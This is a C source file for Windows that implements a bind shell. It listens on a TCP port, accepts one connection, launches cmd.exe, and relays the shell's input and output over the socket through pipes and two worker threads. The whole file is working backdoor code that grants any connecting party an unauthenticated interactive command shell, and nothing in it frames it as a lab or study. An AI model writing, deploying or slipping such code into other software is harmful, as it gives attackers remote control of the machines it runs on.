#include "server.h"

extern HANDLE inputPipeRead;
extern HANDLE inputPipeWrite;
extern HANDLE outputPipeRead;
extern HANDLE outputPipeWrite;
extern SOCKET clientSock;

void configureSocket(void) {
    WSADATA wsData;
    DWORD result, sendResult;
    SOCKET listeningSocket = INVALID_SOCKET;

    struct addrinfo *resolvedAddr = NULL;
    struct addrinfo hints;

    // Initialize Winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsData);
    if (result != 0) {
        printf("Failed to initialize Winsock: %d\n", result);
        exitWithError(TEXT("WSAStartup failed"));
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve server address and port
    result = getaddrinfo(NULL, DEFAULT_PORT, &hints, &resolvedAddr);
    if (result != 0) {
        printf("Address resolution failed: %d\n", result);
        WSACleanup();
        exitWithError(TEXT("getaddrinfo failed"));
    }

    // Create a listening socket
    listeningSocket = socket(resolvedAddr->ai_family, resolvedAddr->ai_socktype, resolvedAddr->ai_protocol);
    if (listeningSocket == INVALID_SOCKET) {
        printf("Socket creation failed: %ld\n", WSAGetLastError());
        freeaddrinfo(resolvedAddr);
        WSACleanup();
        exitWithError(TEXT("Socket creation failed"));
    }

    // Bind the socket
    result = bind(listeningSocket, resolvedAddr->ai_addr, (int)resolvedAddr->ai_addrlen);
    if (result == SOCKET_ERROR) {
        printf("Binding failed: %d\n", WSAGetLastError());
        freeaddrinfo(resolvedAddr);
        closesocket(listeningSocket);
        WSACleanup();
        exitWithError(TEXT("Binding failed"));
    }

    freeaddrinfo(resolvedAddr);

    // Start listening
    result = listen(listeningSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        printf("Listening failed: %d\n", WSAGetLastError());
        closesocket(listeningSocket);
        WSACleanup();
        exitWithError(TEXT("Listening failed"));
    }

    // Accept a client connection
    clientSock = accept(listeningSocket, NULL, NULL);
    if (clientSock == INVALID_SOCKET) {
        printf("Connection acceptance failed: %d\n", WSAGetLastError());
        closesocket(listeningSocket);
        WSACleanup();
        exitWithError(TEXT("Connection acceptance failed"));
    }

    closesocket(listeningSocket); // No longer need the listening socket
}

void spawnChildProcess(void) {
    TCHAR commandLine[] = TEXT("C:\\Windows\\System32\\cmd.exe");
    PROCESS_INFORMATION procInfo;
    STARTUPINFO startupInfo;
    BOOL success = FALSE;

    ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    startupInfo.cb = sizeof(STARTUPINFO);
    startupInfo.hStdError = outputPipeWrite;
    startupInfo.hStdOutput = outputPipeWrite;
    startupInfo.hStdInput = inputPipeRead;
    startupInfo.dwFlags |= STARTF_USESTDHANDLES;

    success = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &procInfo);

    if (!success)
        exitWithError(TEXT("Process creation failed"));
    else {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);

        CloseHandle(outputPipeWrite);
        CloseHandle(inputPipeRead);
    }
}

void setupPipes(void) {
    SECURITY_ATTRIBUTES secAttr;

    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&outputPipeRead, &outputPipeWrite, &secAttr, 0))
        exitWithError(TEXT("Output pipe creation failed"));

    if (!SetHandleInformation(outputPipeRead, HANDLE_FLAG_INHERIT, 0))
        exitWithError(TEXT("Output pipe handle setting failed"));

    if (!CreatePipe(&inputPipeRead, &inputPipeWrite, &secAttr, 0))
        exitWithError(TEXT("Input pipe creation failed"));

    if (!SetHandleInformation(inputPipeWrite, HANDLE_FLAG_INHERIT, 0))
        exitWithError(TEXT("Input pipe handle setting failed"));
}

void processClientConnection(void) {
    setupPipes();
    configureSocket();
    spawnChildProcess();

    HANDLE workerThreads[2];
    workerThreads[0] = CreateThread(NULL, 0, handleWritePipe, NULL, 0, NULL);
    workerThreads[1] = CreateThread(NULL, 0, handleReadPipe, NULL, 0, NULL);

    WaitForMultipleObjects(2, workerThreads, TRUE, INFINITE);

    for (int i = 0; i < 2; ++i)
        CloseHandle(workerThreads[i]);

    closeClientSocket();
}

DWORD WINAPI handleWritePipe(LPDWORD param) {
    UNREFERENCED_PARAMETER(param);

    DWORD bytesWritten, result;
    CHAR buffer[BUFSIZE] = "";

    while (TRUE) {
        BOOL success = FALSE;
        memset(buffer, 0, sizeof(buffer));
        while (!(result = recv(clientSock, buffer, BUFSIZE, 0))) ;
        if (result < 0) {
            printf("Receiving data failed: %d\n", WSAGetLastError());
            exit(-1);
        }

        success = WriteFile(inputPipeWrite, buffer, strlen(buffer), &bytesWritten, NULL);
        if (!success || !bytesWritten) {
            return 0;
        }
    }
    return 0;
}

DWORD WINAPI handleReadPipe(LPDWORD param) {
    UNREFERENCED_PARAMETER(param);

    DWORD bytesRead, bytesWritten, sendResult;
    CHAR buffer[BUFSIZE + 1];

    while (TRUE) {
        BOOL success = FALSE;

        success = ReadFile(outputPipeRead, buffer, BUFSIZE, &bytesRead, NULL);
        if (!success) {
            return 0;
        }

        buffer[bytesRead] = 0;

        sendResult = send(clientSock, buffer, bytesRead, 0);
        if (sendResult == SOCKET_ERROR) {
            exit(-1);
        }
    }
    return 0;
}

void closeClientSocket(void) {
    DWORD result = shutdown(clientSock, SD_SEND);
    if (result == SOCKET_ERROR) {
        printf("Shutdown failed: %d\n", WSAGetLastError());
        closesocket(clientSock);
        WSACleanup();
        exitWithError(TEXT("Shutdown failed"));
    }
    closesocket(clientSock);
    WSACleanup();
}

void exitWithError(PTSTR functionName) {
    LPVOID msgBuffer;
    LPVOID displayBuffer;
    DWORD errorCode = GetLastError();

    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                    FORMAT_MESSAGE_IGNORE_INSERTS,
                  NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                  (LPTSTR)&msgBuffer, 0, NULL);

    displayBuffer = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
                                        (lstrlen((LPCTSTR)msgBuffer) + lstrlen((LPCTSTR)functionName) + 40) *
                                        sizeof(TCHAR));
    StringCchPrintf((LPTSTR)displayBuffer, LocalSize(displayBuffer) / sizeof(TCHAR),
                    TEXT("%s failed with error %d: %s"), functionName, errorCode, msgBuffer);
    MessageBox(NULL, (LPCTSTR)displayBuffer, TEXT("Error"), MB_OK);

    LocalFree(msgBuffer);
    LocalFree(displayBuffer);
    ExitProcess(1);
}
